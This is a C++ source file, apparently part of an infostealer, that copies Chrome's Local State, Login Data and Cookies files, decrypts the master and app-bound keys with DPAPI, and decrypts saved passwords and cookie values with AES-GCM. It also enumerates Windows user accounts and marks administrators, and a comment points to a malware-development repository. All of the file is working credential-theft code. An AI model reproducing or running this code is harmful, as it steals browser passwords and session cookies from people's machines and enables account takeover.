#include "mod_info.hpp"
#include "misc.hpp"

void mod_Info::test_Data() {
	std::cout << "CHROME PROFILES DUMP_TEST:\n";
	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
	//	std::cout << "\nPATH: " << profile.strPath << "\n";
	//	std::string Login_Path = profile.strPath + "Login Data";
	//	std::cout << "\nNAME: " << profile.strName << "\n";
	//	std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
	//	std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
	//	std::cout << "USERNAME: " << profile.strUserName << "\n";
	//	std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
	//	profile.strPath += "Login Data";
	//	for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
	//		std::cout << "URL: " << data.strUrl << "\n";
	//		std::cout << "Action: " << data.strAction<< "\n";
	//		std::cout << "User: " << data.strUser<< "\n";
	//		std::cout << "Pass: " << data.strPassword<< "\n";
	//	}
		std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath, profile.strName)) {
			if (nCookie.strValue != "ENCRYPTED_ERR" && nCookie.strValue != "") {
				/*std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
				std::cout << "host_key: " << nCookie.strHostKey << "\n";
				std::cout << "name: " << nCookie.strName << "\n";
				std::cout << "value: " << nCookie.strValue << "\n";
				std::cout << "path: " << nCookie.strPath << "\n";
				std::cout << "expires_utc: " << nCookie.strExpiresUTC << "\n";
				std::cout << "last_access_utc: " << nCookie.strLastAccessUTC << "\n";
				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";*/
			}
		}
		std::cout << "\n==================================\n";
	}

}

//https://github.com/oomar400/Malware-Development/tree/main/Malware101%3AInfostealers
std::string mod_Info::m_DecryptData(const std::string& strPass) {

	size_t encSize = strPass.size();
	std::string strOut = "ENCRYPTED_ERR";
	
	if (!this->isBcrptOK || encSize < 31) {
		return strOut;
	}

	std::string version = strPass.substr(0, 3);

	NTSTATUS nStatus = 0;

	ULONG uPlainSize =              0;

	std::vector<BYTE> vc_CipherPass(encSize);
	std::vector<BYTE> vc_Plain;
	std::vector<BYTE> IV(12);

	memcpy(IV.data(), strPass.data() + 3, 12);
	memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);

	size_t tagOffset = encSize - 31;
	if (tagOffset < 0 || tagOffset > vc_CipherPass.size()) {
		__DBG_("Error parseando el offset");
		return strOut;
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	authInfo.pbNonce = IV.data();
	authInfo.cbNonce = 12;
	authInfo.pbTag = vc_CipherPass.data() + tagOffset;
	authInfo.cbTag = 16;
	authInfo.dwFlags &= ~BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;

	nStatus = BCryptDecrypt((version == "v20" ? this->hKey2 : this->hKey), vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_1 error", GetLastError());
		return strOut;
	}

	vc_Plain.resize(uPlainSize);

	nStatus = BCryptDecrypt((version == "v20" ? this->hKey2 : this->hKey), vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_2", nStatus);
		return strOut;
	}
	
	strOut = std::string(vc_Plain.begin(), vc_Plain.end());

	return strOut;
}

std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
	DATA_BLOB encryptedPass, decryptedPass;
	std::string strOut = "";
	std::string strTmp = strPass;
	strTmp.erase(strTmp.find_last_not_of(" \n\r\t") + 1);

	encryptedPass.cbData = (DWORD)strTmp.size();
	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);

	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
	
	
	if (!::CryptUnprotectData(
		&encryptedPass, // In Data
		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
		NULL,           // Optional entropy
		NULL,           // Reserved
		NULL,           // Here, the optional
		// prompt structure is not
		// used.
		0,
		&decryptedPass)) {
		__DBG_("Error desencriptando la password");
		__DBG_(GetLastError());
	}else {
		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
	}
	
	free(encryptedPass.pbData); encryptedPass.pbData = NULL;

	return strOut;
}


std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
	int iBuffSize = 4096;
	std::vector<Chrome_Profile> vcOut;

	LPSTR env_var = (LPSTR)malloc(iBuffSize);
	if (env_var == NULL) {
		__DBG_("No se pudo reservar memoria");
		return vcOut;
	}
	
	if (GetEnvironmentVariable("APPDATA", env_var, iBuffSize) == 0) {
		_DBG_("Error", GetLastError());
		return vcOut;
	}
	
	std::string strPath = env_var;
	
	free(env_var); env_var = NULL;

	std::vector<std::string> vcTemp = strSplit(strPath, '\\', 1024);
	vcTemp.pop_back();
	
	strPath = "";
	for (std::string sub_path : vcTemp) {
		strPath += sub_path + "\\";
	}
	strPath += "Local\\Google\\Chrome\\User Data\\";

	this->strBasePath = strPath;
	
	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
	std::string strFile = strPath + "Local State";
	if (!::CopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
		__DBG_("No se pudo copiar el archivo local state");
		__DBG_(GetLastError());
		return vcOut;
	}

	std::ifstream iFile("saramambichi");
	if (iFile.is_open()) {
		nlohmann::json jeyson = nlohmann::json::parse(iFile);
		if (!jeyson.is_null()) {
			this->vcChromeProfiles.clear();

			//Informacion de perfiles de chrome
			for (auto& itm : jeyson["profile"]["info_cache"].items()) {
				std::string temp_Path = strPath + itm.key() + "\\";
				Chrome_Profile nProfile;
				nProfile.strPath = temp_Path;
				nProfile.strName         = itm.value()["name"         ];
				nProfile.strGaiaName     = itm.value()["gaia_name"    ];
				nProfile.strShortCutName = itm.value()["shortcut_name"];
				nProfile.strUserName     = itm.value()["user_name"    ];
				nProfile.strHostedDomain = itm.value()["hosted_domain"];
				vcOut.push_back(nProfile);

				this->vcChromeProfiles.push_back(nProfile);
			}

			//##################################################################################
			//                          Desencriptar llave maestra
			//##################################################################################
			std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
			std::string strBoundKey = base64_decode(jeyson["os_crypt"]["app_bound_encrypted_key"]);
			
			strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
			strBoundKey = strBoundKey.substr(4, strBoundKey.size() - 4);

			strMasterKey = this->m_DecryptMasterKey(strMasterKey);
			strBoundKey = this->m_DecryptMasterKey(strBoundKey);

			this->vcChromeKey.resize(strMasterKey.size());
			this->vcBoundKey.resize(strBoundKey.size());

			memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
			memcpy(this->vcBoundKey.data(), strBoundKey.data(), strBoundKey.size());

			DATA_BLOB MasterKey;
			MasterKey.cbData = this->vcChromeKey.size();
			MasterKey.pbData = this->vcChromeKey.data();
			NTSTATUS nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
			}else {
				this->isBcrptOK = true;
			}

			MasterKey.cbData = this->vcBoundKey.size();
			MasterKey.pbData = this->vcBoundKey.data();

			nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey2, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
			}
			else {
				this->isBcrptOK = true;
			}
			//##################################################################################
			//##################################################################################
		}
		iFile.close();
	}

	DeleteFile("saramambichi");

	return vcOut;
}

std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& strUserPath) {
	std::vector<Chrome_Login_Data> vcOut;
	std::string randomR = RandomID(6);
	if (::CopyFileA((LPCSTR)strUserPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
		sqlite3* db;

		int iRet = sqlite3_open(randomR.c_str(), &db);

		if (iRet == SQLITE_OK) {
			const char* cQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins;";
			sqlite3_stmt* pStmt;

			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
			if (iRet == SQLITE_OK) {
				iRet = sqlite3_step(pStmt);
				while (iRet == SQLITE_ROW) {
					if (sqlite3_column_bytes(pStmt, 3) > 0 && sqlite3_column_bytes(pStmt, 2) > 0) {
						Chrome_Login_Data nPassword;
						nPassword.strUrl = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
						nPassword.strAction = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
						nPassword.strUser = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 2));
						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
						nPassword.strPassword = this->m_DecryptData(temp_Pass);
						vcOut.push_back(nPassword);
					}
					iRet = sqlite3_step(pStmt);
				}
			}
			sqlite3_finalize(pStmt);
		}


		sqlite3_close(db);

		DeleteFile((LPCSTR)randomR.c_str());
	}else {
		__DBG_("No se puco copiar la bd del usuario ");
		__DBG_(GetLastError());
	}

	return vcOut;
}

std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath, const std::string& name) {
	std::vector<Cookie> vcOut;
	std::string strPath = strUserPath + "Network\\Cookies";
	std::string randomR = name; //  RandomID(6);
	if (::CopyFileA((LPCSTR)strPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
		sqlite3* db;

		int iRet = sqlite3_open(randomR.c_str(), &db);

		if (iRet == SQLITE_OK) {
			const char* cQuery = "SELECT  creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc FROM cookies WHERE encrypted_value != '';";
			sqlite3_stmt* pStmt;

			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
			if (iRet == SQLITE_OK) {
				iRet = sqlite3_step(pStmt);
				while (iRet == SQLITE_ROW) {
					if (sqlite3_column_bytes(pStmt, 3) > 0) {
						Cookie nCookie;
						nCookie.strCreationUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
						nCookie.strHostKey = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
						nCookie.strName = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 2));

						//Decrypt value
						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
						nCookie.strValue = this->m_DecryptData(temp_Pass);

						nCookie.strPath = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 4));
						nCookie.strExpiresUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 5));
						nCookie.strLastAccessUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 6));
						nCookie.strLastUpdateUTC = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 7));
						vcOut.push_back(nCookie);
					}
					iRet = sqlite3_step(pStmt);
				}
			}
			sqlite3_finalize(pStmt);
		}

		sqlite3_close(db);

		//DeleteFile((LPCSTR)randomR.c_str());
	} else {
		__DBG_("No se puco copiar la bd del usuario ");
		__DBG_(GetLastError());
	}

	return vcOut;
}

std::vector<std::string> mod_Info::m_Usuarios() {
	std::vector<std::string> vcOut;
	LPUSER_INFO_11 lUsers = nullptr;
	LPUSER_INFO_11 lTmpuser = nullptr;
	DWORD dCount = 0, dHints = 0;
	NET_API_STATUS nStatus;
	do {
		nStatus = NetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((lTmpuser = lUsers) != nullptr) {
				for (DWORD i = 0; (i < dCount); i++) {
					if (lUsers == NULL) {
						__DBG_("lUsers = NULL")
						break;
					}
					std::wstring st = lTmpuser->usri11_name;
					std::string strTempUser(st.begin(), st.end());
					if (strTempUser != "") {
						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
							strTempUser += " (ADMIN)";
						}
						vcOut.push_back(strTempUser);
					}
					lTmpuser++;
				}
			}
		}
		if (lUsers != nullptr) {
			NetApiBufferFree(lUsers);
			lUsers = nullptr;
		}
	} while (nStatus == ERROR_MORE_DATA);
	if (lUsers != nullptr) {
		NetApiBufferFree(lUsers);
		lUsers = nullptr;
	}
	return vcOut;
}